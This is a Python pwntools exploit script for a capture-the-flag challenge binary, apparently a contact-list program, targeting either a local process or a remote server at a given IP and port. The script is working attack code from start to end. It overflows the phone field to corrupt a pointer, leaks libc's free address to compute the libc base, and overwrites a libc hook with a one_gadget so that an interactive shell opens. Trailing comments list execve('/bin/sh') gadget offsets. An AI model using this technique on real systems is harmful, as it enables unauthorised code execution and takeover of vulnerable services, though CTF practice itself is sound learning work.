# coding:utf-8
from pwn import *
debug = 1
context.log_level='debug'
elf = ELF('./ctf')
#libc = ELF('./libc32')
if debug:
    p = process('./ctf')#,env={'LD_PRELOAD':'./libc32'})
    libc=ELF('/home/moonagirl/moonagirl/libc/libc_local_x64')
#    gdb.attach(p)
else:
    p = remote('49.4.23.164', 32232)#  49.4.23.164 32232
    libc = ELF('/home/moonagirl/moonagirl/libc/libc6_2.23-0ubuntu10_amd64.so')

def z(a=''):
    gdb.attach(p,a)
    if a == '':
        raw_input()

def menu(id):
	p.recvuntil('0. Exit\n')
	p.sendline(str(id))

def add(name,phone):
	menu(2)
	p.recvuntil('Enter the name of the contact:')
	p.sendline(name)
	p.recvuntil('Enter the phone number of the contact:')
	p.sendline(phone)

def remove(id):
	menu(4)
	p.recvuntil('Enter the id of the entry to remove:')
	p.sendline(str(id))

def list():
	menu(1)

def edit(index,name,phone):
	menu(3)
	p.recvuntil('Enter the index of the entry:')
	p.sendline(str(index))
	p.recvuntil('Enter the name of the contact:')
	p.sendline(name)
	p.recvuntil('Enter the phone number of the contact:')
	p.sendline(phone)

add('aaaa','1111')#1
add('bbbb','2222')#2
add('bbbb','2222')#2
remove(3)
add('bbbb','2222')#2
payload = 'Y'*(16 + 16 + 8) + '\xe8\x1f\x60'
edit(1,'cccc',payload)
list()

p.recvuntil('id: [3]')
p.recvuntil('Number: [')
data = u64(p.recv(6).ljust(8,'\x00'))
libc_base = data - libc.symbols['free']
one_gadget = libc_base + 0x4526a
malloc_hook = libc_base + libc.symbols['__free_hook']
system = libc_base + libc.symbols['system']

malloc_hook = malloc_hook - 0x10 - 0x20
a1 = hex(malloc_hook)[12:]
a2 = hex(malloc_hook)[10:12]
a3 = hex(malloc_hook)[8:10]
a4 = hex(malloc_hook)[6:8]
a5 = hex(malloc_hook)[4:6]
a6 = hex(malloc_hook)[2:4]

payload = 'Y'*(16 + 16 + 8) + chr(int(a1,16))+chr(int(a2,16))+chr(int(a3,16))+chr(int(a4,16))+chr(int(a5,16))+chr(int(a6,16))
edit(1,'cccc',payload)

a1 = hex(one_gadget)[12:]
a2 = hex(one_gadget)[10:12]
a3 = hex(one_gadget)[8:10]
a4 = hex(one_gadget)[6:8]
a5 = hex(one_gadget)[4:6]
a6 = hex(one_gadget)[2:4]
payload = chr(int(a1,16))+chr(int(a2,16))+chr(int(a3,16))+chr(int(a4,16))+chr(int(a5,16))+chr(int(a6,16))
print payload
print 'one_gadget:' + hex(one_gadget)
edit(3,payload,payload)
p.interactive()

# 0x45216	execve("/bin/sh", rsp+0x30, environ)
# constraints:
#   rax == NULL

# 0x4526a	execve("/bin/sh", rsp+0x30, environ)
# constraints:
#   [rsp+0x30] == NULL

# 0xf0274	execve("/bin/sh", rsp+0x50, environ)
# constraints:
#   [rsp+0x50] == NULL

# 0xf1117	execve("/bin/sh", rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
